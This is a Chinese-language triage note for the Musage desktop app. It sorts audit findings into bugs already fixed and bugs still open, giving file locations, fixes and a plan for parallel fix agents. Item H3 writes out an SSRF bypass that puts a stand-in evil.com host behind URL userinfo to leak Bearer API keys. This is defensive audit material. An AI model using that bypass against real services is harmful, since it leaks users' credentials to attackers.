# Musage 2026-08-03 交叉验证 + 去重修复列表

> 用户新粘贴 8 域审查报告（16510 行）vs 已修 17 个 audit-fix commits + 1 个 verify follow-up。
> 目的：把已修的剔除，把待修的整理成可执行的清单。

## 去重总览

| Paste ID | 粘贴报告标题 | 已修 commit | 状态 |
|---|---|---|---|
| M-P2 | volcengine_ark 429 dead code | `3a71f45` | ✅ 已修 |
| M-Tray-L3 | `musage dump` 不支持内置副本 | `2b75647` | ✅ 已修 |
| M-Platform-SetWindowLongW | `SetWindowLongW` 返值未检查 | `5418865` + `83ee8cd` | ✅ 已修（5418865 第一版检查的是 input 而不是 prev；83ee8cd 补正） |
| M-IPC-007 | `apply_provider_order` fallback | `904697c` | ✅ 已修 |
| M-StepFun-doc | stepfun api_key legacy-only slot 注释 | `3d94bfb` | ✅ 已修（文档） |
| M-Provider-extract_host | IPv6 sentinel for unclosed bracket | `aa163d2` | ✅ 已修 |
| M-Login-SHUTDOWN | anysearch + xiaomi native thread check | `4d82146` | ✅ 已修 |
| M-StepFun-SHUTDOWN | SHUTDOWN + combined token freshness | `9313c41` | ✅ 已修 |
| M-Provider-SSRF | IPv4-mapped IPv6 loopback prefix | `4dc3dca` | ✅ 已修 |
| M-zhipu-num_f64 | clamp percentage | `726bfc4` | ✅ 已修 |
| M-siliconflow-parse_f64 | delegate num_f64 | `cbcd5d6` | ✅ 已修 |
| M-anysearch-is_active | surface as AuthFailed | `44b27bc` | ✅ 已修 |
| M-minimax-clamp | clamp parse_tier_count + num_to_f64 | `582bbb9` | ✅ 已修 |
| M-Providers-429-dedup | remove duplicate 429 blocks | `3a71f45` | ✅ 已修 |
| M-Login-deadline | stepfun/anysearch 14min timeout | `b447db9` + `011c612` | ✅ 已修 |
| M-Test-minimax | smart_reset_to_ms coverage | `ba48afd` | ✅ 已修 |

**16 项已在 2026-08-03 修复并 commit**，全部进 CHANGELOG [Unreleased]。

---

## 待修 High 优先级（6 项 · 数据安全 + 用户可感知）

### H1 · `commands/extra_instances.rs:439-481` — `delete_extra_instance` 回滚三 bug，凭据永久丢失 + keys.json 状态不一致

**净效果**：`[A#1, B#2, C#3]` 删 #2 时若 `extra_instances::save` 失败，B 的凭据永久丢失，C 的凭据残留在 #2 槽位。

**三处叠加 bug**：
1. `migrations_done` 只存 `(old_ref, cred)` 不存 `new_ref`，回滚时 `delete_credential_for_id(&inst.api_key_ref)` 删的是 old_ref（刚 save 回去的）而非 new_ref（migration 创建的）
2. `target_cred_backup` 在 migration 循环**之后**才加载，gap-filling 场景下拿到的是 C 的凭据而非 B 的
3. gap-filling 场景 `target_cred_backup` 被置 None，B 的凭据永不恢复

**修法**：`migrations_done` 改三元组 `(old_ref, new_ref, cred)` + backup 提前加载 + gap-filling 不置 None。

---

### H2 · `commands/mod.rs:145,176,526` — `get_snapshot`/`set_provider_enabled` 用 `source_id` 而非 `snapshot_key`

**净效果**：用户禁用 `minimax#2` 后浮窗仍显示其旧数据；enabled 分支会推入重复 placeholder。

**根因**：三处 retain/any 用 `p.source_id.as_deref()` 比对，但副本 snapshot 的 `source_id` 是 base id（"minimax"），`unique_id` 才是 "minimax#2"。

**修法**：三处统一替换为 `snapshot_key(p)`（P3 fix 已确立的统一规则，line 1610-1615）。

---

### H3 · `providers/custom.rs:234-254` — SSRF 检查可通过 `@` userinfo 绕过，泄露 API Key

**净效果**：分享的 custom source config 中 `base_url = "https://api.legit.com@evil.com"` 会让 reqwest 连 `evil.com`（`api.legit.com` 被解析为 URL userinfo），`is_ssrf_blocked("evil.com")` 返 false（非 loopback），Bearer API Key 发送到攻击者服务器。

**修法**：URL 构造后、SSRF 检查前拒绝 authority 含 `@` 的 URL（custom source 不需要 userinfo）。

---

### H4 · `providers/volcengine_ark.rs:438-453` — `ResetTimestamp` 未过滤 `<= 0`（D-013 fix 漏落）

**净效果**：API 返 0/负数时 `resets_at = Some(0)`，浮窗显示 1970-01-01。

**修法**：`.and_then(|ts| if ts <= 0 { None } else { Some(ts) })`。

---

### H5 · `providers/zhipu.rs:407` — `nextResetTime` 未过滤 `<= 0`（D-013 fix 漏落）

**净效果**：同 H4，zhipu 漏落 D-013 fix。

**修法**：加 `.filter(|ts| *ts > 0)`。

---

### H6 · `poller.rs:320-321` — jitter sleep 串行阻塞 poller 主循环，SHUTDOWN 在 sleep 期间无法响应

**净效果**：`quit_app` 的 500ms drain 窗口内 poller 卡在 sleep，`app.exit(0)` 强杀进程，in-flight fetch 被强杀、JoinSet 残留 panic 日志。**直接违背 H1 fix 的设计意图**。

**根因**：D5-074 fix 引入的 `tokio::time::sleep(jitter_ms).await` 写在 for 循环里、写在 `tokio::select! { SHUTDOWN.notified() }` 之外。长时间睡眠（合盖唤醒）后 12 个 provider 全过期，for 循环顺序 sleep ≈ 36-72s。

**修法**：把 jitter sleep 移进 spawn 的 task 里，主循环只推进 entry。

---

## 待修 Medium 优先级（17 项 · 已选 8 项进入下批）

### 立刻修（一行 / 小范围）
| ID | 文件 | 问题 |
|---|---|---|
| **P-M1** | `providers/volcengine_ark.rs:328-334` | 无条件 `warn!` 打印响应 body 前 2000 字符（含 PlanName/UsageList 账户信息 + 5xx stack trace），生产环境长期泄露敏感数据 |
| **C-M1** | `config.rs:941-946` | `best_effort_from_value` 漏给 `zenmux_payg_concise_mode` 设 `recognized_any = true` |
| **C-M2** | `config.rs` | `extra_instances.json.bak.<ts>` 没有任何清理路径，会无限累积（与 `keys.json.bak` 一致：`truncate_old_backups(parent, "extra_instances.json", 5)`） |
| **T-M1** | `tray.rs:1088` | tooltip sanitize 不一致 |
| **T-M2** | `tray.rs:1107` | `format_amount_short` is_finite 缺失 |
| **F-M1** | `src/main.ts:763,786-792` | 多实例重新登录按钮 baseId 拆 uniqueId/baseId |

### 尽快修（小范围回归）
| ID | 文件 | 问题 |
|---|---|---|
| **I-M1** | `commands/mod.rs` | `list_picker_providers` 漏掉 `anysearch` 和 `volcengine_ark` 两个内置 provider |
| **I-M2** | `commands/mod.rs` | `list_picker_providers` 中 `stepfun` 的 `auth_kind` 与实际 provider 实现不一致 |
| **I-M3** | `commands/mod.rs` | `refresh_single` IPC 不检查 `tick_is_running()`——与全量刷新并发导致 backoff 双倍计数 |

### 下个版本修（架构债）
| ID | 文件 | 问题 |
|---|---|---|
| **L-M1** | 3 个 login module | `DONE` 折叠进 `gen`（用 `AtomicU64`） |
| **PL-M1/PL-M2** | `platform/macos.rs` | OneSlot 改 oneshot channel |
| **PO-M1** | `poller_backoff.rs` | backoff 变化时重排 `next_fetch` entry |
| **L-M2** | `anysearch_login.rs` | `READY` 标记不持久化（init script 顺序调整） |
| **L-M3** | `stepfun_login.rs` | refresh cookie 跨域（需真实账号验证） |
| **IPC L-3** | `commands/extra_instances.rs:84-102` | `update_extra_instance`/`test_extra_instance` 不支持 `secret_key` 字段（火山方舟 AK+SK 无法走 extra instance） |

---

## 待修 Low（已选 8 项，其余 deferred · 一致性 / 已知设计）

- `logstore.rs:304` `spawn_append_job` 用 `.expect()` panic 会循环（OnceLock 闭包 panic 后续每次 push 都 panic）
- `extra_instances.rs:267-281` 迁移时所有 custom instance `created_at` 用同一个 `now`（应保留 `spec.created_at`）
- `config.rs:1248-1259` `save_credential_for_id` 对 None 字段不删除（stepfun bug 同类根因，已知设计）
- `config.rs:576` 旧格式迁移 save 失败静默吞错
- `config.rs:1080-1083` `truncate_old_backups` 不验证后缀是数字，用户手动 .bak 文件被误删
- `custom_sources.json.bak.<ts>` 同 C-M2 不清理
- `logstore.rs:271-316` worker 死后永久失去落盘能力不重启
- `i18n.rs:34-39` `set_app_locale` 在 save 之前 `set_locale`，save 失败时 in-memory/disk/前端三态不一致
- `mod.rs:136` `set_provider_enabled` 在 `config.write` 内嵌套 `extra_instances.read`（锁顺序脆弱，当前不死锁）
- `windows.rs:234-256` 已修
- macOS/Win hover emitter + fullscreen watcher `break` 退出后未 reset `*_RUNNING` 标志
- `lib.rs:492-557` geom_persister shutdown 信号 `notify_waiters` 竞态（do_work 期间通知丢失），改 `notify_one`
- `tray.rs:145` `load_font` 用 `env!("CARGO_MANIFEST_DIR")` 生产路径不存在（H7 fix 同源 bug 漏修，fallback 系统字体不 panic）
- `lib.rs:624-635` 已修
- `logs.ts:96` class 属性 `${e.level}` 未转义（文本转义了，CSP + 后端 enum 兜底，可利用性低）
- `order.ts:410,611,860` finally 块 `getConfig()` 未 try/catch → unhandled rejection
- `credentials.ts:742-743` 火山方舟 AK/SK 双字段写入非原子，失败时徽章不更新
- `advanced.ts:359-379` Import 配置缺前端字段校验（完全依赖后端）
- `order.ts:267` 等 CSS 选择器拼接未转义 `data-id`（当前 id 安全）

---

## 修复优先级建议（去重后）

### 立即修（数据安全 / 用户可感知）— 共 6 项
1. **H1** delete_extra_instance 回滚三 bug — 凭据丢失风险
2. **H2** get_snapshot/set_provider_enabled 用 snapshot_key — 禁用副本不生效
3. **H3** custom.rs `@` userinfo SSRF — API Key 泄露
4. **H6** jitter sleep 移进 spawn task — quit_app drain 失效
5. **H4/H5** volcengine_ark + zhipu ResetTimestamp `<=0` 过滤 — 一行改动 ×2，对齐 D-013

### 尽快修（回归 / 一致性）— 共 6 项
6. **P-M1** volcengine_ark 生产日志脱敏
7. **I-M1/I-M2** list_picker_providers 动态化（补 anysearch/volcengine_ark + 修 stepfun auth_kind）
8. **T-M1/T-M2** tooltip sanitize + format_amount_short is_finite — 一行改动 ×2
9. **F-M1** 多实例重新登录按钮 baseId — 拆 uniqueId/baseId
10. **C-M1** zenmux_payg_concise_mode recognized_any — 一行
11. **C-M2** extra_instances.json.bak 清理 — 一行 `truncate_old_backups`

### 下个版本修 — 共 6 项
12. **L-M1** 三模块 DONE 折叠进 gen（AtomicU64）
13. **PL-M1/PL-M2** macOS OneSlot 改 oneshot channel
14. **PO-M1** backoff 变化重排 next_fetch entry
15. **I-M3** refresh_single 检查 tick_is_running
16. **L-M2** anysearch READY 不持久化 / init script 顺序调整
17. **L-M3** stepfun refresh cookie 跨域（需真实账号验证）

### 已知 tech debt（报告但接受）
- Backoff 未持久化、Per-provider task shutdown（已部分偿还）、refresh_inner Box::new 12 source、dump CLI 不支持副本（已修）、load_font 生产路径、set_provider_enabled 锁嵌套

---

## 下一步建议

**启动 6 个并行 fix agent**（每个聚焦 H1-H6 + 对应 medium）：
- Agent H1: `commands/extra_instances.rs:439-481`
- Agent H2: `commands/mod.rs:145,176,526`
- Agent H3: `providers/custom.rs:234-254`
- Agent H4/H5: `providers/{volcengine_ark,zhipu}.rs`
- Agent H6: `poller.rs:320-321`
- Agent Medium: 6 项 M1/M2（volcengine_ark 脱敏 + IPC dynamization + tray tooltip + main.ts re-login + config 清理）

每个 agent 限定 1-3 个文件 write set + cargo test --lib 验证。
